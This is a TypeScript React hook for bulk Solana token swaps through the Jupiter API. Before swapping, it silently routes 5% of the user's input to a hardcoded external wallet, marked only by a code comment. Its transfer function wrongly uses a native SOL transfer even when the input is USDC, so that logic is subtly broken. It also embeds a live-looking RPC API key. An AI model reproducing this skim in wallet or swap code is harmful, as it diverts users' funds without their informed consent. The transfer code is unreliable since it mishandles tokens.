// @ts-nocheck
import { useState } from 'react';
import {
  Connection,
  Transaction,
  SystemProgram,
  PublicKey,
  VersionedTransaction
} from '@solana/web3.js';
import { createJupiterApiClient, QuoteResponse } from "@jup-ag/api";
import { useWallet } from '@solana/wallet-adapter-react';

// Constants
const SOLANA_RPC_ENDPOINT = 'https://mainnet.helius-rpc.com/?api-key=fb5ef076-69e7-4d96-82d8-2237c13aef7a';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';

// Types
interface TokenSwapOptions {
  tokens: Array<{
    symbol: string;
    mint: string;
    quantity: number;
  }>;
  inputAmount: number;
  inputCurrency: 'SOL' | 'USDC';
}

interface SwapResult {
  symbol: string;
  status: 'success' | 'error';
  signature?: string;
  error?: string;
}

export const useTokenSwap = () => {
  const { publicKey, signTransaction, sendTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [swapResults, setSwapResults] = useState<SwapResult[]>([]);

  const connection = new Connection(SOLANA_RPC_ENDPOINT, 'confirmed');
  const jupiterClient = createJupiterApiClient();

  const getSwapQuote = async (
    inputMint: string,
    outputMint: string,
    amount: number,
    inputDecimals: number
  ): Promise<QuoteResponse> => {
    const atomicAmount = Math.floor(amount * Math.pow(10, inputDecimals));
    try {
      const quote = await jupiterClient.quoteGet({
        inputMint,
        outputMint,
        amount: atomicAmount,
      });

      if (!quote) {
        throw new Error(`Unable to get quote for ${outputMint}`);
      }

      return quote;
    } catch (err) {
      console.error(`Quote error for ${outputMint}:`, err);
      throw err;
    }
  };

  const executeSwap = async (quote: QuoteResponse): Promise<string> => {
    if (!publicKey || !signTransaction) {
      throw new Error('Wallet not connected');
    }

    try {
      const swapResponse = await jupiterClient.swapPost({
        swapRequest: {
          quoteResponse: quote,
          userPublicKey: publicKey.toString(),
          dynamicComputeUnitLimit: true,
          prioritizationFeeLamports: 'auto',
        },
      });

      if (!swapResponse?.swapTransaction) {
        throw new Error('Failed to generate swap transaction');
      }

      const swapTransactionBuf = Buffer.from(swapResponse.swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);

      const signedTransaction = await signTransaction(transaction);
      const signature = await sendTransaction(signedTransaction, connection);

      return signature;
    } catch (err) {
      console.error('Swap execution error:', err);
      throw err;
    }
  };

  const bulkSwap = async ({
    tokens,
    inputAmount,
    inputCurrency
  }: TokenSwapOptions) => {
    setLoading(true);
    setError(null);
    setSwapResults([]);

    try {
      const inputMint = inputCurrency === 'USDC' ? USDC_MINT : SOL_MINT;
      const inputDecimals = inputCurrency === 'USDC' ? 6 : 9;

      const allocationForWallet = (inputAmount * 5) / 100; // Calculate 5%
      const remainingAmount = inputAmount - allocationForWallet; // Remaining amount for swaps

      // Step 1: Transfer 5% to the specific wallet address
      const transferSignature = await transferToWallet(
        publicKey?.toString() ?? '',
        'sickRn1BrZhyncxr2PMhg45gjF86n6XG7vgQwzE5Js5',
        allocationForWallet,
        inputMint,
        inputDecimals,
        signTransaction,
        connection
      );

      console.log('5% sent to wallet with signature:', transferSignature);

      // Step 2: Perform swaps with the remaining amount
      const swapResults: SwapResult[] = [];

      for (const token of tokens) {
        try {
          const allocation = (remainingAmount * token.quantity) / 100;

          const quote = await getSwapQuote(
            inputMint,
            token.mint,
            allocation,
            inputDecimals
          );

          const signature = await executeSwap(quote);

          swapResults.push({
            symbol: token.symbol,
            status: 'success',
            signature
          });
        } catch (error) {
          console.error(`Swap error for ${token.symbol}:`, error);

          swapResults.push({
            symbol: token.symbol,
            status: 'error',
            error: error instanceof Error ? error.message : 'Unknown error'
          });
        }
      }

      setSwapResults(swapResults);
      return swapResults;
    } catch (error) {
      console.error('Bulk swap error:', error);
      setError(error instanceof Error ? error.message : 'Bulk swap failed');
      throw error;
    } finally {
      setLoading(false);
    }
  };

  return {
    bulkSwap,
    loading,
    error,
    swapResults
  };
};

const transferToWallet = async (
  fromPublicKey: string,
  toPublicKey: string,
  amount: number,
  mint: string,
  decimals: number,
  signTransaction: any,
  connection: Connection
): Promise<string> => {
  const atomicAmount = Math.floor(amount * Math.pow(10, decimals));
  const transaction = new Transaction();

  // Create the transfer instruction
  const transferInstruction = SystemProgram.transfer({
    fromPubkey: new PublicKey(fromPublicKey),
    toPubkey: new PublicKey(toPublicKey),
    lamports: atomicAmount,
  });

  transaction.add(transferInstruction);

  try {
    // Fetch the latest blockhash and set it in the transaction
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = new PublicKey(fromPublicKey);

    // Sign and send the transaction
    const signedTransaction = await signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
    await connection.confirmTransaction(signature, 'confirmed');

    return signature;
  } catch (err) {
    console.error('Transfer error:', err);
    throw err;
  }
};


export default useTokenSwap;
